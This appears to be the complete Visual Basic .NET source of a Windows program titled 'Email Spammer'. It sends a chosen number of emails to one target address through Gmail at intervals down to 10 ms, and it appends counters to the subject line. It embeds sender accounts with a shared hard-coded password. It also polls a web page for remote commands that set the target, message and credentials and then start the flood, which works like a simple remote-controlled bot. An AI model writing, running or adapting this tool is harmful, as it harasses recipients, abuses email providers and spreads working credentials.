Imports System.Net.Mail
Imports System.IO
Public Class Form1
    Dim sent As Integer
    Dim amount As Integer
    Dim percent_calc As Double
    Dim state As Integer
    Dim gmail_gprev As Integer
    Dim txtbox3_cont As String
    Dim oldsent As Integer
    Dim blog_start As Boolean
    Dim state_adv_b As String
    Dim EmailMessage As New MailMessage





    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        txtbox3_cont = TextBox3.Text
        If txtbox3_cont.Contains("gmail") Then
            gmail_gprev = 1
        End If
        Select Case blog_start
            Case True

            Case False
                MsgBox("Email Spaming Started!", MsgBoxStyle.OkOnly, "Email Spammer")
        End Select
        TextBox2.Enabled = False
        Button1.Enabled = False
        TextBox1.Enabled = False
        TextBox3.Enabled = False
        TextBox4.Enabled = False
        Body_Box1.Enabled = False
        MaskedTextBox1.Enabled = False
        NumericUpDown1.Enabled = False
        amount = NumericUpDown1.Value
        ProgressBar1.Maximum = amount
        Label8.Text = sent.ToString + " of " + amount.ToString + " Sent"
        Timer1.Start()
        Select Case TextBox3.Text
            Case "coolstuff.lee@gmail.com"
                nospam()
            Case "Coolstuff.lee@gmail.com"
                nospam()
        End Select
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Select Case sent
            Case amount
                Reset_form()
                Timer1.Stop()
                MsgBox("Email Spaming Complete!", MsgBoxStyle.OkOnly, "Email Spammer")
            Case Else
                Send()
        End Select

    End Sub

    Private Sub Send()
        Try
            sent = sent + 1
            Dim EmailMessage As New MailMessage
            Dim Email_Address As String = TextBox3.Text

            EmailMessage.From = New MailAddress(TextBox1.Text)
            EmailMessage.To.Add(Email_Address)
            Select Case gmail_gprev
                Case 1
                    EmailMessage.Subject = (TextBox4.Text & Space(10) & sent.ToString)
                Case Else
                    EmailMessage.Subject = (TextBox4.Text)
            End Select
            With EmailMessage
                .Body = (Body_Box1.Text)
                .Priority = MailPriority.High
                .IsBodyHtml = True
            End With


            Dim SimpleSMTP As New SmtpClient("smtp.gmail.com")
            SimpleSMTP.Port = 587
            SimpleSMTP.EnableSsl = True
            SimpleSMTP.Credentials = (New System.Net.NetworkCredential(TextBox1.Text, MaskedTextBox1.Text))

            SimpleSMTP.Send(EmailMessage)
            ProgressBar1.Value = sent
            percent_calc = 100 * sent \ amount
            Label7.Text = percent_calc.ToString + "% Complete"
            Label8.Text = sent.ToString + " of " + amount.ToString + " Sent"

        Catch ex As Exception
            oldsent = sent
            Reset_form()
            MsgBox("Error, check email's and password" & Space(5) & sent.ToString, MsgBoxStyle.Exclamation, "Error")

        End Try

    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        sent = 0
        amount = 0
        percent_calc = 0
        state = 1
        gmail_gprev = 0
        blog_start = False
        Button7.Enabled = False
        state_adv_b = 1
        Me.Width = 445
    End Sub

    Private Sub Reset_form()
        Timer1.Stop()
        Timer2.Interval = 10000
        Select Case CheckBox1.CheckState
            Case CheckState.Checked
                Timer2.Start()
                blog_start = True
            Case CheckState.Unchecked
                Timer2.Stop()
                blog_start = False
            Case CheckState.Indeterminate
                Timer2.Stop()
                blog_start = False
        End Select
        TextBox2.Enabled = True
        Button1.Enabled = True
        TextBox1.Enabled = True
        TextBox3.Enabled = True
        TextBox4.Enabled = True
        Body_Box1.Enabled = True
        MaskedTextBox1.Enabled = True
        NumericUpDown1.Enabled = True
        amount = 0
        ProgressBar1.Value = 0
        sent = 0
        percent_calc = 0
        Label7.Text = "0% Complete"
        Label8.Text = "0 of 0 Sent"
    End Sub
    Private Sub NotifyIcon1_MouseDoubleClick(ByVal sender As System.Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Try
            Me.Show()
            Me.WindowState = FormWindowState.Normal
            NotifyIcon1.Visible = False
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_Resize(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Resize
        Try
            If Me.WindowState = FormWindowState.Minimized Then
                Me.Hide()
                NotifyIcon1.Visible = True
                NotifyIcon1.ShowBalloonTip(20)
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Reset_form()

    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        state = state + 1
        Select Case state
            Case 1
                Start()
                Button2.Text = "Pause"
            Case 2
                pause()
                Button2.Text = "Start"
                state = 0
        End Select

    End Sub

    Private Sub nospam()
        MsgBox("Can Not Spam Me Ha Ha Ha Ha!!", MsgBoxStyle.Critical, "ERROR")
        TextBox3.Text = ""
        Reset_form()
    End Sub
    Private Sub TextBox1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            If TextBox1.Text = "load john long" Then
                TextBox1.Text = "spamin.ur.inbox@gmail.com"
                MaskedTextBox1.Text = "spaminl33"
            End If
            If TextBox1.Text = "load mary wang" Then
                TextBox1.Text = "spam.cramed.in.ur.ass@gmail.com"
                MaskedTextBox1.Text = "spaminl33"
            End If
            If TextBox1.Text = "load bob jones" Then
                TextBox1.Text = "spam.crammed.in.ur.ass@gmail.com"
                MaskedTextBox1.Text = "spaminl33"
            End If
        End If
    End Sub
   
    Private Sub HelpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HelpToolStripMenuItem.Click
        Module1.SaveToDisk("Info.txt", My.Computer.FileSystem.SpecialDirectories.Temp + "\Info.txt")
        Process.Start("notepad", My.Computer.FileSystem.SpecialDirectories.Temp + "\Info.txt")
    End Sub
    Private Sub Body_Box1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Body_Box1.KeyDown
        If e.KeyCode = Keys.Enter Then
            If Body_Box1.Text = "show all emails" Then
                Body_Box1.Text = ("mary wang - spam.cramed.in.ur.ass@gmail.com" & vbNewLine & "john long - spamin.ur.inbox@gmail.com" & vbNewLine & "bob jones - spam.crammed.in.ur.ass@gmail.com" & vbNewLine & "All passwords are spaminl33")
            End If
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged
        Select Case CheckBox1.CheckState
            Case CheckState.Checked
                Timer2.Start()
                blog_start = True
            Case CheckState.Unchecked
                Timer2.Stop()
                blog_start = False
            Case CheckState.Indeterminate
                Timer2.Stop()
                blog_start = False
        End Select
    End Sub
    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Try
            Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(TextBox2.Text)
            Dim response As System.Net.HttpWebResponse = request.GetResponse()
            If response.StatusCode = Net.HttpStatusCode.OK Then
                Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
                Dim sourcecode As String = sr.ReadToEnd
                Dim text() As String
                Dim outputt As String
                Dim all As String = sourcecode

                Data_Box1.Text = sourcecode
                text = sourcecode.Split("!")
                outputt = text(14)
                TextBox5.Text = outputt
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub TextBox5_TextChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles TextBox5.TextChanged
        execute()
    End Sub
    Private Sub execute()
        Try
            Dim output As String
            Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(TextBox2.Text)
            Dim response As System.Net.HttpWebResponse = request.GetResponse()
            If response.StatusCode = Net.HttpStatusCode.OK Then
                Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())
                Dim sourcecode As String = sr.ReadToEnd
                Dim text() As String
                Dim all As String = sourcecode

                Data_Box1.Text = sourcecode
                text = sourcecode.Split("!")
                output = text(14)
            End If
            If output.Contains("start") Then
                Button1.PerformClick()
                Timer2.Stop()
            End If
            If output.Contains("address") Then
                Dim address As String = output.Replace("address ", "")
                TextBox3.Text = address
            End If
            If output.Contains("subject") Then
                Dim subj As String = output.Replace("subject ", "")
                TextBox4.Text = subj
            End If
            If output.Contains("body") Then
                Dim bod As String = output.Replace("body ", "")
                Body_Box1.Text = bod
            End If
            If output.Contains("amount") Then
                Dim qty As String = output.Replace("amount ", "")
                NumericUpDown1.Value = qty
            End If
            If output.Contains("from") Then
                Dim frm As String = output.Replace("frm ", "")
                TextBox1.Text = frm.ToString
            End If
            If output.Contains("pass") Then
                Dim ps As String = output.Replace("pass ", "")
                MaskedTextBox1.Text = ps.ToString
            End If




        Catch ex As Exception

        End Try

    End Sub

    
    Private Sub FontToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FontToolStripMenuItem.Click
        FontDialog1.Font = Body_Box1.Font

        FontDialog1.ShowDialog()

        Body_Box1.Font = FontDialog1.Font

    End Sub

    Private Sub ColorToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ColorToolStripMenuItem.Click
        ColorDialog1.Color = Body_Box1.ForeColor

        ColorDialog1.ShowDialog()

        Body_Box1.ForeColor = ColorDialog1.Color
    End Sub

  
    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        If Cc_box.Text = "" Then MsgBox("No Email Entered")
        Cc_list.Items.Add(Cc_box.Text)
        EmailMessage.CC.Add(New MailAddress(Cc_box.Text))
        Cc_box.Text = ""
    End Sub

    Private Sub cc_list_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Cc_list.KeyDown
        Dim selectdel As String
        If e.KeyCode = Keys.Delete Then
            If Cc_list.SelectedItem = "" Then
                Exit Sub
            End If
            selectdel = Cc_list.SelectedItem.ToString()
            Cc_list.Items.Remove(selectdel)
        End If
    End Sub

    Private Sub Cc_box_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Cc_box.KeyDown
        If e.KeyCode = Keys.Enter Then
            Button4.PerformClick()
        End If
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        If bcc_box.Text = "" Then MsgBox("No Email Entered")
        bcc_list.Items.Add(bcc_box.Text)
        EmailMessage.Bcc.Add(New MailAddress(bcc_box.Text))
        bcc_box.Text = ""
    End Sub

    Private Sub bcc_box_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles bcc_box.KeyDown
        If e.KeyCode = Keys.Enter Then
            Button5.PerformClick()
        End If
    End Sub

    Private Sub bcc_list_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles bcc_list.KeyDown
        Dim selectdel As String
        If e.KeyCode = Keys.Delete Then
            If bcc_list.SelectedItem = "" Then
                Exit Sub
            End If
            selectdel = bcc_list.SelectedItem.ToString()
            bcc_list.Items.Remove(selectdel)

        End If
    End Sub


    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        Dim copy As String

        If Body_Box1.SelectionAlignment = HorizontalAlignment.Center Then
            copy = Body_Box1.Text
            Body_Box1.Text = ("<center>" & copy.ToString & "</center>")
        End If

        If Body_Box1.Font.Bold = True Then
            copy = Body_Box1.Text
            Body_Box1.Text = ("<b>" & copy.ToString & "</b>")
        End If
        copy = Body_Box1.Text
        Select Case Body_Box1.Font.Size
            Case Is <= 10
                Body_Box1.Text = ("<font size = ""1"">" & copy.ToString & "</font>")
            Case Is <= 20
                Body_Box1.Text = ("<font size = ""2"">" & copy.ToString & "</font>")
            Case Is <= 30
                Body_Box1.Text = ("<font size = ""3"">" & copy.ToString & "</font>")
            Case Is <= 40
                Body_Box1.Text = ("<font size = ""4"">" & copy.ToString & "</font>")
            Case Is <= 50
                Body_Box1.Text = ("<font size = ""5"">" & copy.ToString & "</font>")
            Case Is <= 60
                Body_Box1.Text = ("<font size = ""6"">" & copy.ToString & "</font>")
            Case Is <= 72
                Body_Box1.Text = ("<font size = ""7"">" & copy.ToString & "</font>")
        End Select
        copy = Body_Box1.Text
        Body_Box1.Text = ("<font color =" & (System.Drawing.ColorTranslator.ToHtml(ColorDialog1.Color)) & ">" & copy.ToString & "</font>")

        Body_Box1.ForeColor = Color.Black
        FontDialog1.Reset()
        Body_Box1.Font = FontDialog1.Font
        Body_Box1.ForeColor = Color.Black
        Button6.Enabled = False
        Button7.Enabled = True
    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        Button6.Enabled = True
        Button7.Enabled = False
    End Sub

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        Dim copy As String
        Dim url_address As String
        url_address = InputBox("Enter Url", "Enter Url", "http:\\")
        copy = Body_Box1.Text
        Body_Box1.Text = ("<img src =" & url_address & ">" & copy.ToString & "</img>")
    End Sub

    Private Sub CenterToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CenterToolStripMenuItem.Click
        Body_Box1.SelectionAlignment = HorizontalAlignment.Center
    End Sub

    Private Sub AdvancedToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AdvancedToolStripMenuItem.Click
        state_adv_b = state_adv_b + 1
        Select Case state_adv_b
            Case 1
                Me.Width = 445
                AdvancedToolStripMenuItem.Text = "Advanced"
            Case 2
                Me.Width = 890
                AdvancedToolStripMenuItem.Text = "Basic"
                state_adv_b = 0
        End Select
    End Sub

   
    Private Sub SlowToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SlowToolStripMenuItem.Click
        Timer1.Interval = 5000
    End Sub

    Private Sub MediumToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MediumToolStripMenuItem.Click
        Timer1.Interval = 2000
    End Sub

    
    Private Sub FastlaggyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FastlaggyToolStripMenuItem.Click
        Timer1.Interval = 500
    End Sub

    
    Private Sub NINJAToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NINJAToolStripMenuItem.Click
        Timer1.Interval = 10
    End Sub
    Private Sub pause()
        Timer1.Stop()
        TextBox2.Enabled = True
        Button1.Enabled = True
        TextBox1.Enabled = True
        TextBox3.Enabled = True
        TextBox4.Enabled = True
        Body_Box1.Enabled = True
        MaskedTextBox1.Enabled = True
        NumericUpDown1.Enabled = True
    End Sub
    Private Sub start()
        Timer1.Start()
        TextBox2.Enabled = True
        Button1.Enabled = True
        TextBox1.Enabled = True
        TextBox3.Enabled = True
        TextBox4.Enabled = True
        Body_Box1.Enabled = True
        MaskedTextBox1.Enabled = True
        NumericUpDown1.Enabled = True
    End Sub
End Class
